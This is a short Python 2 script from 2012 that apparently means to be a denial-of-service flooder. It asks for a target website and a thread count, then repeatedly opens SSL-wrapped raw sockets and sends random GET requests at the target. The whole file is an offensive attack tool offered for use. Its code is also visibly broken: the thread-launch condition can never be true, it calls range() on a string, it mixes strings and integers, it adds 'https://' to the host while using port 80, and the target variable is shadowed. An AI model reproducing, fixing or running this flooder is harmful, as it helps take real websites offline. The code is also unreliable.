#!/usr/bin/python
'''
Created on Jan 28, 2012

@author: just0x41man
'''
import socket,ssl,time,random,threading



threads = list()
inp = ""
def cli():     
        print "%s" % ("Enter attackers WEBSITE(Enter it without http or https):")
        """
        Enter it without http or https
        """
        inp = raw_input()
        print "%s" % ("Input number of threads:")
        num = raw_input()
        if num == None or int(num) == None:
            if inp[:4] != "http":
                for i in range(num):
                    th = threading.Thread(target=main,args=())
                    threads.append(th)
                    th.start()
                    th.join()
                    print "%s" % ("Thread "+i+" started ...")
                    
            else:
                print "Please enter it without http"
                cli() 

def main():
        while 1:
            sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.SOL_TCP)
            addr = socket.gethostbyname(inp)
            dots = addr.split('.')
            rhost = ""
            for dot in dots:
                tmp = hex(int(dot))
                rhost += tmp.split("x")[1]
            count = random.randrange(0,5000)
            s = ssl.wrap_socket(sock, keyfile=None, certfile=None)
            
            s.connect(("https://"+inp,80))
            r = random.randrange(0,99999999999999)
            headers = ""
            headers = headers*count
            data = "GET /"+r+" HTTP/1.1\r\nHOST: "+inp+"\r\n"
            s.send(headers+data, None)
            time.sleep(5)
            s.close()
    

if __name__ == '__main__':
    try:
        cli()
    except Exception:
        print "%s" % ("You've gotta somewhere problem try it again")
        cli()
    
    
        
        

        
